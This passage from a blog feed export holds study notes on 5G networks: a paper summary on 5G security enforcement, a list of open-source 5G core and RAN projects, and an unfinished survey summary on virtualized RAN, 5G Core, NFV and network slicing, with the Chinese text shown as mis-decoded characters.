æ”¶é›†çœŸå¯¦çš„å®‰å…¨äº‹ä»¶ï¼ˆäº‹å¯¦ï¼‰ï¼Œé€™è¦æ­¸åŠŸæ–¼é™„åŠ æˆ–åµŒå…¥å…¶ä¸­çš„ç”¨æˆ¶å¹³é¢å®‰å…¨æª¢æŸ¥åŠŸèƒ½ã€‚æ­¤å®‰å…¨è¨Šæ¯å¯èƒ½æœƒè¢« PCF ç­‰æ´»å‹• NF ä½¿ç”¨ï¼Œä»¥å‹•æ…‹æ›´æ–° UE çµ„ä¸­ç‰¹å®š UE çš„ PCC è¦å‰‡ã€æ›´æ”¹ PDU æˆ–ä»€è‡³åœ¨éœ€è¦æ™‚åœ¨åˆ‡ç‰‡ç´šåˆ¥æ¡å–è¡Œå‹•</p><h2 id="4-Future-work"><a href="#4-Future-work" class="headerlink" title="4. Future work"></a>4. Future work</h2><p>åŸºæ–¼æœ¬è«–æ–‡æå‡ºçš„Security Enforcementçš„åŸå‰‡ï¼Œæœ‰ä¸‰å€‹é ˜åŸŸå¯ä»¥é€²ä¸€æ­¥å»ç ”ç©¶</p><ul><li>specific security analytics supported by machine learning algorithms</li><li>roaming scenarios, including local break out</li><li>applicability to IoT use cases</li></ul><h2 id="5-Conclusion"><a href="#5-Conclusion" class="headerlink" title="5. Conclusion"></a>5. Conclusion</h2><p><img src="https://i.imgur.com/VkTuInH.png"></p><h2 id="åƒè€ƒè³‡æº"><a href="#åƒè€ƒè³‡æº" class="headerlink" title="åƒè€ƒè³‡æº"></a>åƒè€ƒè³‡æº</h2><p><a href="https://www.sciencedirect.com/science/article/pii/S0140366421001262">https://www.sciencedirect.com/science/article/pii/S0140366421001262</a></p><p>meetingç°¡å ±: <a href="https://drive.google.com/file/d/1RK6R5yjRuvS-BhdTjZPhOXAg9ghlW2O6/view?usp=sharing">https://drive.google.com/file/d/1RK6R5yjRuvS-BhdTjZPhOXAg9ghlW2O6/view?usp=sharing</a></p>]]></content>
      
      
      <categories>
          
          <category> è«–æ–‡å°è®€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 5G </tag>
            
            <tag> Security Policy </tag>
            
            <tag> 3GPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ğŸ§ªç­†è¨˜-5Gé–‹æºè³‡æºæ•´ç†</title>
      <link href="/posts/dd26b396.html"/>
      <url>/posts/dd26b396.html</url>
      
        <content type="html"><![CDATA[<h2 id="æ¶æ§‹"><a href="#æ¶æ§‹" class="headerlink" title="æ¶æ§‹:"></a>æ¶æ§‹:</h2><p><img src="https://i.imgur.com/XyqAjzZ.png"></p><p><img src="https://i.imgur.com/3DQV6fW.png"></p><h2 id="é–‹æºå°ˆæ¡ˆ"><a href="#é–‹æºå°ˆæ¡ˆ" class="headerlink" title="é–‹æºå°ˆæ¡ˆ"></a>é–‹æºå°ˆæ¡ˆ</h2><ul><li>Open5GS - Open5GS contains a series of software components and network functions that implement the 4G&#x2F; 5G NSA and 5G SA core functions.<br><a href="https://github.com/open5gs/open5gs">https://github.com/open5gs/open5gs</a></li><li>open5gs + oai config :<a href="https://github.com/s5uishida/open5gs_epc_oai_sample_config">https://github.com/s5uishida/open5gs_epc_oai_sample_config</a><br>open5gs æœ‰å¯¦ä½œ4G EPC èˆ‡ 5G 5GCï¼Œå› æ­¤ä»¥çµ„ç¶²æ–¹æ¡ˆä¾†èªªï¼Œoption3ã€option7ã€option4å¯èƒ½éƒ½æ˜¯å¯è¡Œçš„ </li><li>dockerlized Open5GS<br><a href="https://github.com/herlesupreeth/docker_open5gs">https://github.com/herlesupreeth/docker_open5gs</a></li><li>Softwarization of 5G System<br><a href="https://github.com/LABORA-INF-UFG/NetSoft2020-Tutorial4">https://github.com/LABORA-INF-UFG/NetSoft2020-Tutorial4</a></li><li>free5GC - Open Source 5G core network<br><a href="https://github.com/free5gc/free5gc/wiki">https://github.com/free5gc/free5gc/wiki</a></li><li>C-RAN ä»‹ç´¹<br><a href="https://www.ufispace.com/company/blog/what-is-cran-the-evolution-from-dran-to-cran">https://www.ufispace.com/company/blog/what-is-cran-the-evolution-from-dran-to-cran</a></li><li>UERANSIM  - is the open-source state-of-the-art 5G UE and RAN (gNodeB)<br><a href="https://github.com/aligungr/UERANSIM">https://github.com/aligungr/UERANSIM</a><br>å¥½åƒæœ‰å¯¦ä½œæª”æ¡ˆï¼Œä½†æ˜¯å¥½åƒæ˜¯ç”¨ä¾†æ¸¬æ ¸ç¶²çš„ï¼Œè€Œä¸”ä¹Ÿé‚„æ²’æœ‰ç¬¦åˆO-RANæ¶æ§‹</li><li>Awesome 5G - åˆ—å‡ºå„ç¨®5Gé–‹æºå°ˆæ¡ˆ<br><a href="https://github.com/calee0219/awesome-5g">https://github.com/calee0219/awesome-5g</a></li><li>free5GRAN - é–‹æº5G RANæ¶æ§‹ (ä»¥SAä½œç‚ºçµ„ç¶²æ¶æ§‹)<br><a href="https://github.com/free5G/free5GRAN">https://github.com/free5G/free5GRAN</a></li><li>O-RAN OSC<br><a href="https://github.com/o-ran-sc?language=c">https://github.com/o-ran-sc?language=c</a></li><li>OAI -Open Air Interface 5G<br><a href="https://gitlab.eurecom.fr/oai/openairinterface5g/-/wikis/home">https://gitlab.eurecom.fr/oai/openairinterface5g/-/wikis/home</a></li><li>OAI 5G NSA æ­å»ºæ•™å­¸: <a href="https://blog.csdn.net/BUPTOctopus/article/details/107717942">https://blog.csdn.net/BUPTOctopus/article/details/107717942</a></li></ul><h2 id="O-RAN-Components"><a href="#O-RAN-Components" class="headerlink" title="O-RAN Components"></a>O-RAN Components</h2><p>OSC é‡‹å‡ºå„component ä¸‹è¼‰<br><a href="https://wiki.o-ran-sc.org/pages/viewpage.action?pageId=20876303">https://wiki.o-ran-sc.org/pages/viewpage.action?pageId=20876303</a></p><p>O-RAM Developer Wiki - è£¡é¢æœ‰éƒ¨å±¬æ•™å­¸<br><a href="https://wiki.o-ran-sc.org/display/ORAN/Project+Developer+Wiki">https://wiki.o-ran-sc.org/display/ORAN/Project+Developer+Wiki</a></p>]]></content>
      
      
      <categories>
          
          <category> è³‡æºæ•´ç† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 5G </tag>
            
            <tag> Network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ğŸ—‚ï¸è«–æ–‡è³æ:O-RAN ä»¥åŠè™›æ“¬åŒ– 5G ç¶²è·¯</title>
      <link href="/posts/a1cfeb54.html"/>
      <url>/posts/a1cfeb54.html</url>
      
        <content type="html"><![CDATA[<div class="note primary no-icon flat"><p>é€™æ˜¯ç¯‡survey paper<br><strong>Title</strong>: â€œOpen, Programmable, and Virtualized 5G Networks: State-of-the-Art and the Road Aheadâ€<br><strong>College</strong>: Institute for the Wireless Internet of Things, Northeastern University<br><strong>Authors</strong>: Leonardo Bonati,Michele Polese,Salvatore Dâ€™Oro,Stefano Basagni,Tommaso Melodia<br><strong>Citation</strong>: 24</p></div><h1 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h1><p>5Gå¾ˆå¤šå¥½è™•ï¼ŒSoftware-defined cellular networks ä¹Ÿå¸¶ä¾†å¾ˆå¤šè®ŠåŒ–ï¼Œç›®å‰ä¹Ÿè¨±å¤š5Gé–‹æºå°ˆæ¡ˆï¼Œæœ¬ç¯‡æœƒä»‹ç´¹éå¸¸å¤šç•¶å‰çš„é–‹æº5Gå°ˆæ¡ˆä»¥åŠå…¶å…§éƒ¨ç´°ç¯€ï¼Œä¸¦ä»‹ç´¹å…¶æ¡†æ¶è·Ÿç›¸æ‡‰çš„ç¡¬é«”ç’°å¢ƒèˆ‡Testbedsã€‚</p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>5Gæ‡‰ç”¨å¤šå…ƒ - VRã€é ç¨‹æ‰‹è¡“ã€é«˜è§£æä¸²æµå½±åƒã€ç§æœ‰(private)èœ‚çª©ç¶²è·¯ï¼Œè€Œå‚³çµ±è¡Œå‹•ç¶²è·¯æ¶æ§‹å‰‡ç›¸å°ä¸éˆæ´»ã€ä¸å½ˆæ€§ï¼Œç„¡æ³•æ»¿è¶³å¯¦ç¾5Gæ‡‰ç”¨æ‰€å…·å‚™çš„æ¢ä»¶ï¼Œç¾è¡Œè¡Œå‹•ç¶²è·¯çš„é»‘ç®±åšæ³•å¸¶ä¾†è¨±å¤šé™åˆ¶ï¼Œåƒæ˜¯è»Ÿç¡¬é«”éš¨æ’å³ç”¨(plug and play)ï¼Œä½†å»ç¼ºä¹äº†é‡æ–°è¨­å®šçš„èƒ½åŠ›ï¼Œä¸¦ä¸”ç„¡æ³•æ§åˆ¶å¤§é‡å¯ç”¨è³‡æºï¼Œä½¿å…¶é›£ä»¥ä½¿ç¶²è·¯æ“ä½œé”åˆ°å³æ™‚æµé‡æ§åˆ¶é€™ä»¶äº‹ï¼Œä¸¦é›£ä»¥é€²è¡Œè³‡æºç®¡ç†ï¼Œæ•ˆèƒ½ä¹Ÿæ²’æœ‰æœ€ä½³åŒ–ï¼Œé›£ä»¥å¯¦ç¾<strong>Connectivity-as-a-Service (CAAS)</strong> æŠ€è¡“ï¼Œä¾‹å¦‚å°ˆç”¨èœ‚çª©ç¶²è·¯(private cellular network)ã€‚</p><p>æ¥­ç•Œèˆ‡å­¸ç•Œçš†èªç‚º5Gæ‡‰è©²æ”¹è®Šé€™ç¨®Plug and playçš„ä½œæ³•ï¼Œæ‡‰è©²è¦æ¡ç”¨å¯ç¨‹å¼åŒ–ã€é–‹æ”¾ã€è³‡æºå…±äº«ã€é‚Šç·£åŒ–çš„ç¶²è·¯è§£æ±ºæ–¹æ¡ˆï¼Œä¾‹å¦‚ SDNã€ç¶²è·¯è™›æ“¬åŒ–ã€MEC(Multi-access Edge Computing)ï¼Œé€™äº›æ–¹æ¡ˆä½¿å¾—å‹•æ…‹ç¶²è·¯æ§åˆ¶èˆ‡æ•æ·ç®¡ç†æˆç‚ºå¯èƒ½ã€‚åŒæ¨£çš„ï¼Œ<strong>ç¶²è·¯åˆ‡ç‰‡(Netwrok Slicing)</strong> èˆ‡  <strong>C-RAN(Cloud RAN)</strong> ä¹Ÿè­‰å¯¦äº† å…±äº«åŸºç¤æ¶æ§‹(infrastrucutre sharing) ä¸åƒ…èƒ½å¤ ä½¿è³‡æºåˆ©ç”¨æœ€å¤§åŒ–ä¹Ÿèƒ½å¸¶ä¾†æ–°å¸‚å ´æ©Ÿæœƒã€‚å‚³çµ±å°é–‰çš„çš„é›»ä¿¡ç¶²è·¯ä¸€èˆ¬äººé›£ä»¥æ¥è§¸åˆ°ï¼Œç¾ä»Šç”±GNU Radio Libraries å®šç¾©çš„è»Ÿé«”ç¯„ä¾‹è¢«ç´å…¥<strong>OpenAirInterface(OAI)</strong> å’Œ<strong>srsLTE</strong> ä¹‹ä¸­ï¼Œä¸¦å¯åœ¨å•†ç”¨SDRè¨­å‚™ä¸Šå¿«é€Ÿéƒ¨å±¬ã€‚è»Ÿé«”æ¡†æ¶ä¸Šåƒæ˜¯O-RANï¼Œé‹è¡Œåœ¨white-box ä¼ºæœå™¨ä¸Šï¼Œå¯ä¾›é‡æ–°è¨­å®šèˆ‡å„ªåŒ–ç¶²è·¯å’Œæ”¶ç™¼å™¨åŠŸèƒ½ã€‚</p><h1 id="Architectural-enablers-of-5G-cellular-networks"><a href="#Architectural-enablers-of-5G-cellular-networks" class="headerlink" title="Architectural enablers of 5G cellular networks"></a>Architectural enablers of 5G cellular networks</h1><h2 id="Architecture"><a href="#Architecture" class="headerlink" title="Architecture"></a>Architecture</h2><p>è¡Œå‹•ç¶²è·¯å·²æ”¹è®Šæ•´é«”æ¶æ§‹ï¼Œå¾ä»¥å¾€é»‘ç®±ç¡¬é«”é…æœ‰å°ˆç”¨è»ŸéŸŒé«”çš„æ¶æ§‹è®ŠæˆåŸºæ–¼é‹è¡Œåœ¨SDRæˆ–å…¶ä»–ç¡¬é«”çš„é–‹å…ƒè»Ÿé«”ï¼Œä½†é€™å…¶å¯¦å¾4Gæ™‚ä»£å°±ä¸€ç›´è¨è«–åˆ°ç¾åœ¨ã€‚5Gå¾specä¸Šå°±æ¥µæœ‰æ•æ·éƒ¨ç½²çš„å½ˆæ€§åœ¨ï¼Œåœ¨æ—©æœŸéšæ®µä¹Ÿåœ¨å¼„è»Ÿé«”åŒ–çš„æœå‹™ï¼Œé€™ç¨®  <strong>flexibility-by-design</strong> è®“5Gä¸€é–‹å§‹å°±æ¯”è¼ƒå±Œã€‚æ­¤ç« ç¯€ä»‹ç´¹å¾4Gåˆ°5Gçš„ç¶²è·¯æ¶æ§‹ã€RANã€æ ¸ç¶²ã€éƒ¨å±¬ç¯„ä¾‹ã€SDNã€NFVã€ç¶²è·¯åˆ‡ç‰‡ã€MECã€æ™ºèƒ½(Intelligent)ç¶²è·¯<br><img src="https://i.imgur.com/5fc7spi.png"></p><p>é€™å¼µåœ–ä¾†çœ‹ï¼Œ4Géƒ¨å±¬èˆ‡5Gä¼¼ä¹æ²’æœ‰å·®åˆ¥ï¼Œä½†å…¶å¯¦åœ¨Core Networkå…§éƒ¨çµ„æˆèˆ‡è¨­å®šå»å·®å¾ˆå¤šï¼Œ</p><table><thead><tr><th>çµ„æˆ</th><th>4G</th><th>5G</th></tr></thead><tbody><tr><td>RAN</td><td>LTE</td><td>NR</td></tr><tr><td>Core</td><td>EPC</td><td>5GC</td></tr></tbody></table><p>4G EPCä¸­æœ‰è¨±å¤šçµ„æˆä»¥å¾€åŸ·è¡Œåœ¨å°ˆæœ‰ç¡¬é«”ä¸Šçš„ï¼Œæœ€è¿‘æ‰é–‹å§‹éƒ¨ç½²åœ¨è»Ÿé«”ä¸Šçš„ï¼Œ<br>è€Œ5GCå‰‡æ˜¯ä¸€é–‹å§‹å°±æ ¹æ“š åŸºæ–¼æœå‹™çš„æ–¹æ³•ä¾†è¨­è¨ˆçš„ EPC Server è¢«åˆ†æˆè¨±å¤š <strong>è™›æ“¬ç¶²è·¯åŠŸèƒ½(Virtual network functions)</strong> ä¾†æä¾›ç‰¹å®šåŠŸèƒ½ï¼Œå½¼æ­¤ä¹‹é–“ä¹Ÿé€éé–‹æ”¾æ¨™æº–ç•Œé¢ä¾†æºé€šï¼›5G RANä¸­ä¹Ÿæœ‰ç›¸ä¼¼çš„æ‹†åˆ†åŸå‰‡ï¼Œ(CU&#x2F;RU)â€¦etc</p><h3 id="NR"><a href="#NR" class="headerlink" title="NR"></a>NR</h3><ul><li>wider range of carrier frequencies (mmWave Spectrum)</li><li>frame structure: OFDM-basedï¼Œæ›´å…·å½ˆæ€§ã€æ¯å€‹sub-frameä¸­å‚³éçš„å¯è®Šæ•¸é‡çš„symbolï¼Œä¸¦å¯ä½¿ç”¨æ¯”LTEæ›´å¤§çš„é »å¯¬(400Mhz per carrier)</li><li>è¨Šè™Ÿèˆ‡ç¨‹åºçš„æ•´åˆï¼Œç”¨ä»¥ç®¡ç†mmWaveçš„å®šå‘å‚³è¼¸</li><li><strong>5G RANå¯ä»¥æ¥åˆ°4G EPC (non-standalone config) èˆ‡5G 5GC(standalone config)</strong></li><li>NR åŸºç«™ &#x3D; gNodeBs å…è¨±åˆ†æ•£å¼éƒ¨å±¬: protocol stackçš„ä¸åŒpartå¯ä»¥åˆ†æ•£åœ¨ä¸åŒç¡¬é«”çµ„ä»¶ä¸­</li><li>NRçš„protocol stackä¸­ï¼Œåœ¨PDCPä¸Šåœ¨ç–Šäº†ä¸€<strong>SDAP(Service Data Adaptation Protocol) layer</strong> ï¼Œå®ƒç®¡ç†é»å°é»æµé‡ä¹‹é–“çš„QoSï¼Œä¸¦å°‡å…¶mappingåˆ°gNodeB- UE linkä¹‹é–“çš„æœ¬åœ°è³‡æºï¼Œå…¶ä»–å±¤çš†æœ‰æ›´æ–°é”åˆ°NRåŠŸèƒ½</li></ul><h3 id="CU-x2F-DU-split-and-the-virtualized-RAN-architecture"><a href="#CU-x2F-DU-split-and-the-virtualized-RAN-architecture" class="headerlink" title="CU&#x2F;DU split and the virtualized RAN architecture"></a>CU&#x2F;DU split and the virtualized RAN architecture</h3><p>NRä¸­æœ€å‰µæ–°çš„äº‹å°±æ˜¯å°‡3GPP Stack ä¸­çš„è¼ƒé«˜å±¤(PDCPã€SDAPã€RRC)æ–¼è¼ƒä½å±¤(RLCã€MACã€PHY)åˆ†æˆå…©å€‹ä¸åŒçš„logical unitsï¼Œä¹Ÿå°±æ˜¯ CU(Control unit)èˆ‡DU(Distributed Unit)ï¼Œä¸¦å¯éƒ¨å±¬åœ¨ä¸åŒåœ°æ–¹ã€‚è€Œphysical layerä¸­çš„è¼ƒä½å±¤å¯ä»¥èˆ‡DUåˆ†é–‹ï¼Œç¨ç«‹æˆä¸€å€‹RU(Radio Unit)ï¼›CUã€DUã€RUå½¼æ­¤å¯ä»¥è—‰ç”±å®šç¾©å¥½çš„ç•Œé¢ä»¥ä¸åŒçš„data rateè·Ÿlatencyä¾†ç›¸äº’æºé€šã€‚</p><p>é€™ç¨®æ¶æ§‹å‡ºç¾åœ¨3GPPä¸­ï¼Œä¸¦ä½¿vRANæˆ(virtualized RAN)ç‚ºå¯èƒ½:<br><code>attenna å…ƒä»¶</code> $\longrightarrow$ <code>RU</code><br><code>basebandã€signal processing å–®å…ƒ</code> $\longrightarrow$ <code>CUã€DU</code><br>ä»¥ä¸Šçš†å¯è·‘åœ¨é€šç”¨æˆ–å¤šå» å•†çš„å¹³å°æˆ–ç¡¬é«”å…ƒä»¶ä¸Šï¼Œè‹¥ä¸åŒä¸åŒRAN componentsä¹‹é–“çš„ä»‹é¢æ˜¯é–‹æ”¾çš„ï¼Œå‰‡éƒ¨ç½²ä¸ŠæŒ‰ç…§ O-RAN modelèµ°ã€‚</p><h3 id="The-5G-Core"><a href="#The-5G-Core" class="headerlink" title="The 5G Core"></a>The 5G Core</h3><p>service-based approach æ§åˆ¶èˆ‡ç”¨æˆ¶å¹³é¢æ ¸å¿ƒåŠŸèƒ½è¢«æ‹†åˆ†æˆå¤šå€‹ç¶²è·¯åŠŸèƒ½ï¼Œ3GPPä¸­æœ‰å®šç¾©é€™äº›ç¶²è·¯åŠŸèƒ½çš„APIï¼Œå¯å¯¦ç¾å½ˆæ€§ç¶²è·¯éƒ¨å±¬èˆ‡ç¶²è·¯åˆ‡ç‰‡ã€‚</p><ul><li><strong>UPF(User Plane Function)</strong>: Useråˆ°ç¶²è·¯ä¹‹é–“çš„gatewayï¼Œä½œç‚ºç§»å‹•æ€§çš„éŒ¨(anchor)ä»¥åŠ<strong>QoSåˆ†é¡å™¨</strong></li><li><strong>CPF(Control Plane Function)</strong>:4Gæ™‚çš„MMEï¼Œå¤§å¤šè¢«åˆ†é…é€²äº†<strong>AMF(Access and Mobility Management Function)<strong>ï¼›</strong>SMF(Session Management Function)</strong> è² è²¬åˆ†é…IPåœ°å€åˆ°UEï¼Œä¸¦ç·¨æ’(orchestrates)ç”¨æˆ¶å¹³é¢æœå‹™(ä¾‹å¦‚:å“ªå€‹UPFæ˜¯UEè©²ä½¿ç”¨çš„)</li></ul><h2 id="Enabling-technologies-for-softwarized-5G-cellular-networks"><a href="#Enabling-technologies-for-softwarized-5G-cellular-networks" class="headerlink" title="Enabling technologies for softwarized 5G cellular networks"></a>Enabling technologies for softwarized 5G cellular networks</h2><p>5Ræ•´åˆä¸åŒåŠŸèƒ½çµ„ä»¶ã€æ¶æ§‹å°‡æœƒååˆ†é¾å¤§ï¼Œè¦ç®¡ç†å°‡æœƒæ˜¯é›£é¡Œã€‚5Gç¶²è·¯åƒè€ƒäº†é›²ç«¯è¨ˆç®—ç”Ÿæ…‹åœˆä¸­å»£æ³›è€Œå®Œæ•´çš„æµç¨‹èˆ‡æ¶æ§‹ï¼Œå°‡è™›æ“¬åŒ–ã€è»Ÿé«”åŒ–æ•´åˆåœ¨ä¸€èµ·ï¼Œä½¿æœå‹™èˆ‡è¾œèƒ½å¾åŸæœ‰ç¡¬é«”ä¸­æŠ½é›¢å‡ºä¾†ã€‚</p><h3 id="Softwarization-and-software-defined-networking"><a href="#Softwarization-and-software-defined-networking" class="headerlink" title="Softwarization and software-defined networking"></a><code>Softwarization and software-defined networking</code></h3><p>ç‚ºäº†æ•´åˆä¸åŒå» å•†ç¡¬é«”å…ƒä»¶ä¹‹é–“çš„åŠŸèƒ½èˆ‡è¨­å®šåƒæ•¸ï¼Œ5Gç³»çµ±ä»°è³´<strong>è»Ÿé«”åŒ–(Softwarization)</strong></p><ol><li>SDN </li><li>Openflow protocol</li></ol><blockquote><p>SDN: å°‡ç¶²è·¯æ§åˆ¶å¾data planeä¸­è§£è€¦å‡ºä¾†ï¼Œå°‡routingèˆ‡controllingç¨‹åºå¾åŸæœ‰çš„åŸºæ–¼ç¡¬é«”çš„è½‰ç™¼æ“ä½œä¸­åˆ†é›¢å‡ºä¾†ã€‚5Gä¸­å‰‡æ˜¯å°‡RANã€é‚Šç·£ç¡¬é«”å…ƒä»¶å¾å®ƒå€‘çš„ç¶²è·¯å’Œæœå‹™åŠŸèƒ½ä¸­åˆ†é›¢å‡ºä¾†ã€‚</p></blockquote><p>RANæ¶æ§‹ä¸­åªæœ‰RUç¶­æŒåŸºæœ¬transmit receiveåŠŸèƒ½ï¼Œå…¶é¤˜æ§åˆ¶èˆ‡è™•ç†å‰‡ä»¥è—‰ç”±é–‹æ”¾ä»‹é¢èˆ‡APIä¾†ç”¨è»Ÿé«”æ“æ§ã€‚</p><h3 id="Network-function-virtualization-NFV"><a href="#Network-function-virtualization-NFV" class="headerlink" title="Network function virtualization(NFV)"></a><code>Network function virtualization(NFV)</code></h3><p>æ¯é …ç¶²è·¯åŠŸèƒ½è—‰ç”±VNF(Virtual Network Function)ä»¥è»Ÿé«”å¯¦è¸ï¼Œä¸¦åŸ·è¡Œåœ¨VMä¸Š(å»ºç«‹åœ¨é€šç”¨ç¡¬é«”ä¸Š)ï¼ŒNFVå…¶ä¸­ä¸€é …å„ªé»æ˜¯æ¯å€‹VNFéƒ½æä¾›åŸå­ç´šåˆ¥çš„åŠŸèƒ½ï¼Œ<strong>å› æ­¤å¤šå€‹VNFså¯ä»¥çµåˆåœ¨ä¸€èµ·</strong> å‰µé€ å‡ºæ›´è¤‡é›œã€ç‰¹å®šçš„ç¶²è·¯åŠŸèƒ½ã€‚</p><p><img src="https://i.imgur.com/H0J0R7K.png"></p><ol><li>The Network Orchestrator: ç®¡ç†ç‰©ä»¶åŸºç¤æ¶æ§‹ä¸Šçš„VMï¼Œå’Œå…¶é‹è¡Œçš„æœå‹™</li><li>VNF:è·‘åœ¨VMä¸Šä¸¦åŸ·è¡Œç¶²è·¯åŠŸèƒ½</li><li>NFVI(Network Function Virtualization Infrastructure):ç”±å¤šç¨®é€šç”¨ç¡¬é«”çµ„æˆ</li></ol><blockquote><p>ã€€open source network virtualization project:  <strong>Open Platform for NFV (OPNFV)</strong><br>ã€€æä¾›æ¸¬è©¦å·¥å…·ã€é©—è­‰ç¨‹å¼ä¾†åŠ é€Ÿä¼æ¥­å’Œæœå‹™å•†ç¶²è·¯è½‰æ›æˆNFV</p></blockquote><h2 id="RAN-and-Core-Network-slicing"><a href="#RAN-and-Core-Network-slicing" class="headerlink" title="RAN and Core Network slicing"></a>RAN and Core Network slicing</h2><p>Network Slicingæ˜¯ä¸€ç¨®multi-tenancyè™›æ“¬åŒ–æŠ€è¡“ï¼Œå…¶ä¸­ç¶²è·¯åŠŸèƒ½å¾ç¡¬é«”å’Œè»Ÿé«”ä¸­æå–å‡ºä¾†ï¼Œä¸¦ä½œç‚ºåˆ‡ç‰‡ä¾†æä¾›çµ¦æ‰€è¬‚çš„ <code>tenant</code> (ç§Ÿæˆ¶ï¼Œæˆ¿å®¢)ã€‚ç‰©ç†åŸºç¤æ¶æ§‹(åŸºç«™ã€å…‰çº–ã€)æœƒåœ¨å¤šå€‹ç§Ÿæˆ¶ä¹‹é–“å…±äº«ï¼Œä¸€å€‹ç§Ÿæˆ¶å¯èƒ½æœƒæ”¶åˆ°ä¸€å€‹æˆ–å¤šå€‹åˆ‡ç‰‡ã€‚ æ¯å€‹åˆ‡ç‰‡æœƒåˆ†é…ç‰¹å®šçš„ç‰©ç†è³‡æºï¼Œä¸¦åŸºæ–¼è©²ç‰©ç†è³‡æºä¸Šå»ºç«‹ç¨ç«‹çš„è™›æ“¬ç¶²è·¯çš„<a href="https://www.ibm.com/docs/zh-tw/spss-modeler/SaaS?topic=node-what-is-instantiation"><strong>å¯¦ä¾‹åŒ–(instantiate)</strong></a>ï¼Œé›–ç„¶ç§Ÿæˆ¶å°è‡ªå·±çš„åˆ‡ç‰‡å…·æœ‰è³‡æºæ§åˆ¶æ¬Šï¼Œä½†å»ç„¡æ³•èˆ‡å…¶ä»–åˆ‡ç‰‡äº’å‹•ï¼Œé€™åˆè¢«ç¨±ç‚º<strong>slice isolation&#x2F;orthogonality</strong></p><p>æ¯å€‹åˆ‡ç‰‡æ¶µè“‹RANèˆ‡Coreçš„éƒ¨åˆ†çš„ç‰¹å®šç¶²è·¯åŠŸèƒ½ï¼Œç§Ÿæˆ¶å¯åœ¨é¸å®šåŸºç«™ä¸Šé€éRANåˆ‡ç‰‡å¯¦ä¾‹åŒ–æä¾› CaaS (for private cellular networking) çµ¦è¡Œå‹•ç”¨æˆ¶ã€‚ä¹Ÿå¯åˆ†é…RANåˆ‡ç‰‡çµ¦ç‰¹å®šçš„æœå‹™ã€ç”¨æˆ¶ã€æ‡‰ç”¨ä¸Š Ex. åˆ†é…åˆ‡ç‰‡çµ¦è³‡æºéœ€æ±‚é«˜çš„æ‡‰ç”¨(AR&#x2F;VR)<br><img src="https://i.imgur.com/EguDz3w.png"></p><p>é€™å¼µåœ–åœ¨è¬›åˆ‡ç‰‡æŠ€è¡“æ€æ¨£ä½¿infraè³‡æºå…±äº«ä»¥åŠæ”¯æ´å¤šåˆ‡ç‰‡åµŒå…¥åœ¨infra componentsçš„å¯¦ä¾‹åŒ–ä¸¦åˆ—å‡ºç›¸é—œçš„é–‹æºè»Ÿé«”å°ˆæ¡ˆï¼Œä»–å€‘å„è‡ªå°é€™å€‹æ¶æ§‹ä¸Šçš„å“ªäº›éƒ¨åˆ†åšæ§åˆ¶èˆ‡è¨­å®šå’Œå¯¦é«”åŒ–ã€‚</p><h3 id="ç¶²è·¯åˆ‡ç‰‡å„ªé»"><a href="#ç¶²è·¯åˆ‡ç‰‡å„ªé»" class="headerlink" title="ç¶²è·¯åˆ‡ç‰‡å„ªé»:"></a>ç¶²è·¯åˆ‡ç‰‡å„ªé»:</h3><ol><li>æ¯å€‹åˆ‡ç‰‡éƒ½å¯ä»¥ä¿ç•™ä¾†è™•ç†å…·æœ‰ä¸åŒå®‰å…¨è¦æ±‚çš„ç‰¹å®šæµé‡é¡åˆ¥ï¼Œä¸¦åˆ†é…ä¸åŒæ•¸é‡çš„è³‡æºï¼Œå¾è€Œå¯¦ç¾åŸºç¤è¨­æ–½ç´šåˆ¥çš„<strong>æœå‹™å·®ç•°åŒ–(Service differentiation)</strong></li><li>åˆ‡ç‰‡ç”±è»Ÿé«”æ§åˆ¶ï¼Œå¯å¯¦ç¾å°ç¶²è·¯åˆ‡ç‰‡çš„å³æ™‚ã€æ ¹æ“šéœ€æ±‚çš„å¯¦ä¾‹åŒ–ã€é‡æ–°è¨­å®šèˆ‡æ’¤éŠ·ä»¥é©æ‡‰æ™‚é–“è®ŠåŒ–çš„æµé‡éœ€æ±‚ä¸¦ç¬¦åˆ<strong>SLAs(Service Level Aggrements)</strong></li><li>æœªå……åˆ†åˆ©ç”¨è³‡æºä»¥ç¶²è·¯åˆ‡ç‰‡å½¢å¼å¯å‡ºç§Ÿçµ¦ <code>MVNO(Mobile Virtual Network Operators)</code>ï¼Œä¾†å¯¦ç¾è³‡æºçš„æœ€å¤§åˆ©ç”¨ç¨‹åº¦ï¼Œä¸¦çµ¦äºˆinfraæä¾›è€…æ–°çš„ç‡Ÿåˆ©å•†æ©Ÿ</li></ol><p>ç¶²è·¯åˆ‡ç‰‡éœ€è¦è¢«å‹•æ…‹ç·¨æ’ã€å¯¦ä¾‹åŒ–ã€æ’¤éŠ·ï¼Œä¸¦ç¬¦åˆSLAsï¼Œä¸¦å°æ–¼æ•…éšœæˆ–ä¸­æ–·æœ‰å¼·å¤§çš„å®¹å¿æ€§ã€‚</p><p><strong>OSSs(Operations Support Systems)</strong><br>OSSå¯é€éå°ç¶²è·¯åˆ‡ç‰‡çš„é–‰è·¯æ§åˆ¶èˆ‡ç®¡ç†ä¾†ï¼Œä½œç‚ºä¿è­‰å±¥è¡Œæœå‹™çš„å·¥å…·<br>åŒæ™‚ï¼Œç‚ºå‚ç›´è¡Œæ¥­æä¾›åˆ‡ç‰‡æœå‹™çš„é‹ç‡Ÿå•†å’ŒåŸºç¤è¨­æ–½æ‰€æœ‰è€…å¿…é ˆé€šéå°ˆé–€ç”¨æ–¼åæ˜ å‚ç›´è¡Œæ¥­éœ€æ±‚çš„æœå‹™çš„åˆ‡ç‰‡ä¾†ç”Ÿæˆå¤šæ¨£åŒ–çš„å ±åƒ¹ã€‚<br><strong>BSSs(Business Support Systems)</strong><br>BSS å°‡éœ€è¦æ§åˆ¶é€™å€‹å¤šæ¨£åŒ–çš„ç’°å¢ƒä¸¦ç‚ºæ¯å€‹åˆ‡ç‰‡å¯¦æ–½å‹•æ…‹è¨ˆè²»å’Œå®šåƒ¹æ©Ÿåˆ¶</p><h2 id="Multi-access-edge-computing"><a href="#Multi-access-edge-computing" class="headerlink" title="Multi-access edge computing"></a>Multi-access edge 